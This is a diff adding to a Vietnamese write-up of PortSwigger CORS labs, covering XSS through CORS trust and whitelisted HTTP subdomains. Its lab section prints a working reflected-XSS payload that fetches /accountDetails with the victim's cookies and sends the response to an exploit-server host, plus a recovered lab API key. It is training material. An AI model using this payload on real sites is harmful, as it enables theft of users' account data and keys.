@@ -244,5 +244,152 @@ Submit api key và solved bài lab!
 
 ![img](https://github.com/DucThinh47/PortSwigger/blob/main/Cross-origin-resource-sharing-(CORS)/images/image19.png?raw=true)
 
+# Exploiting XSS via CORS trust relationships
+
+Ngay cả khi CORS được cấu hình "đúng cách", nó vẫn thiết lập một mối quan hệ tin cậy giữa hai nguồn gốc (origins).Nếu một trang web tin tưởng một nguồn gốc dễ bị tấn công Cross-Site Scripting (XSS), kẻ tấn công có thể lợi dụng lỗ hổng XSS để chèn một đoạn JavaScript.
+
+Đoạn mã độc này có thể sử dụng CORS để gửi yêu cầu và lấy thông tin nhạy cảm từ trang web đã tin tưởng ứng dụng có lỗ hổng XSS.
+
+# Exploiting XSS via CORS trust relationships - Continued
+
+Giả sử có yêu cầu sau::
+
+    GET /api/requestApiKey HTTP/1.1  
+    Host: vulnerable-website.com  
+    Origin: https://subdomain.vulnerable-website.com  
+    Cookie: sessionid=...  
+
+Nếu máy chủ phản hồi như sau:
+
+    HTTP/1.1 200 OK  
+    Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com  
+    Access-Control-Allow-Credentials: true  
+
+Điều này có nghĩa là máy chủ tin tưởng **subdomain.vulnerable-website.com** và cho phép các yêu cầu CORS từ đây, đồng thời hỗ trợ gửi cookie xác thực (**Access-Control-Allow-Credentials: true**).
+
+Kẻ tấn công có thể lợi dụng lỗ hổng XSS trên **subdomain.vulnerable-website.com** để chèn một đoạn mã JavaScript thực hiện yêu cầu CORS và đánh cắp API key. Ví dụ:
+
+    https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
+
+Khi nạn nhân truy cập liên kết trên, mã JavaScript độc hại sẽ chạy trên trình duyệt của họ và thực hiện request CORS đến **vulnerable-website.com** để lấy API key. Vì máy chủ tin tưởng **subdomain.vulnerable-website.com**, nên yêu cầu này sẽ được thực thi và dữ liệu nhạy cảm sẽ bị rò rỉ.
+
+# Breaking TLS with poorly configured CORS
+
+Giả sử một ứng dụng áp dụng nghiêm ngặt giao thức **HTTPS**, nhưng lại **danh sách trắng** (whitelist) một subdomain đáng tin cậy chỉ sử dụng **HTTP**. Điều này tạo ra một lỗ hổng bảo mật nghiêm trọng.
+
+Ví dụ, khi ứng dụng nhận được yêu cầu sau:
+
+    GET /api/requestApiKey HTTP/1.1  
+    Host: vulnerable-website.com  
+    Origin: http://trusted-subdomain.vulnerable-website.com  
+    Cookie: sessionid=...  
+
+Ứng dụng phản hồi:
+
+    HTTP/1.1 200 OK  
+    Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com  
+    Access-Control-Allow-Credentials: true  
+
+Điều này có nghĩa là ứng dụng cho phép truy cập từ một subdomain **không sử dụng HTTPS**.
+
+Kẻ tấn công có thể **chặn lưu lượng HTTP** từ subdomain đó bằng các kỹ thuật như **Man-in-the-Middle (MITM)** hoặc **DNS spoofing**, rồi chèn JavaScript độc hại để gửi yêu cầu CORS đến **vulnerable-website.com**.
+
+Vì **Access-Control-Allow-Credentials: true**, nên trình duyệt sẽ gửi cookie phiên của nạn nhân theo yêu cầu. Kẻ tấn công có thể đánh cắp dữ liệu nhạy cảm từ ứng dụng chính ngay cả khi ứng dụng đó đang sử dụng **HTTPS**.
+
+# Lab: CORS vulnerability with trusted insecure protocols
+
+![img](20)
+
+Truy cập lab: 
+
+![img](21)
+
+Login tài khoản wiener: 
+
+![img](22)
+
+Mở Burp history, tìm kiếm request tới /accountDetails:
+
+![img](23)
+
+=> Response của request: 
+
+![img](24)
+
+=> Có **Access-Control-Allow-Credentials header**, như vậy server có thể hỗ trợ CORS. 
+
+Chỉnh sửa request, thêm header Origin: http://subdomain.0ade004e0488d95280a1bc83008f00d2.web-security-academy.net
+
+![img](25)
+
+Send request, quan sát response:
+
+![img](26)
+
+=> Máy chủ phản hồi **Access-Control-Allow-Origin header**, xác nhận cấu hình CORS cho phép truy cập từ các subdomains khác tùy ý, cả HTTPs và HTTP.
+
+Chọn 1 sản phẩm và check stock: 
+
+![img](27)
+
+=> Trang này sử dụng HTTP. Đồng thời, nhận thấy tham số productID dễ bị tấn công XSS: 
+
+![img](28)
+
+Payload chèn vào exploit server:
+
+    <script>
+        document.location="http://stock.0ade004e0488d95280a1bc83008f00d2.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0ade004e0488d95280a1bc83008f00d2.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a0c007c04d3d989808abbe601a8007f.exploit-server.net/exploit/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+    </script>
+
+Phân tích: 
+
+**Điều hướng nạn nhân đến trang có mã độc**
+
+        <script>
+            document.location="http://stock.0ade004e0488d95280a1bc83008f00d2.web-security-academy.net/?productId=4<script>...</script>&storeId=1"
+        </script>
+
+**document.location=...** sẽ tự động điều hướng trình duyệt của nạn nhân đến một trang web có chứa mã độc: 
+        
+        http://stock.0ade004e0488d95280a1bc83008f00d2.web-security-academy.net/?productId=4<script>...</script>&storeId=1
+
+Do trang web có lỗ hổng **Reflected XSS**, mã JavaScript độc hại sẽ được thực thi ngay khi URL này được tải.
+
+**Gửi yêu cầu CORS để đánh cắp dữ liệu**
+
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','https://0ade004e0488d95280a1bc83008f00d2.web-security-academy.net/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+
+Tạo một **XMLHttpRequest** để gửi yêu cầu GET đến /accountDetails, nơi chứa thông tin tài khoản của nạn nhân.
+
+**req.withCredentials = true;**:
+
+- Buộc trình duyệt gửi cookie đăng nhập của nạn nhân theo yêu cầu.
+- Nếu trang 0ade004e0488d95280a1bc83008f00d2.web-security-academy.net có cấu hình CORS không đúng (Access-Control-Allow-Credentials: true và Access-Control-Allow-Origin không đúng cách), phản hồi sẽ được trình duyệt chấp nhận và xử lý.
+
+**Gửi dữ liệu đánh cắp đến máy chủ của kẻ tấn công**
+
+    function reqListener() {
+        location='https://exploit-0a0c007c04d3d989808abbe601a8007f.exploit-server.net/exploit/log?key='+this.responseText;
+    };
+
+- Khi yêu cầu CORS hoàn thành, reqListener sẽ chạy, lấy nội dung phản hồi từ /accountDetails.
+
+- Sau đó, trình duyệt sẽ điều hướng đến máy chủ của kẻ tấn công, kèm theo dữ liệu đánh cắp (this.responseText), chẳng hạn như thông tin cá nhân hoặc API key.
+
+Deliver attack to victim và xem Access log: 
+
+![img](29)
+
+=> Tìm ra api key của nạn nhân: mS3S2vBwnqpgsmvrdxI8TLnZXm0iqeej
+
+Submit api key và solved bài lab!
+
+![img](30)
+
 
 
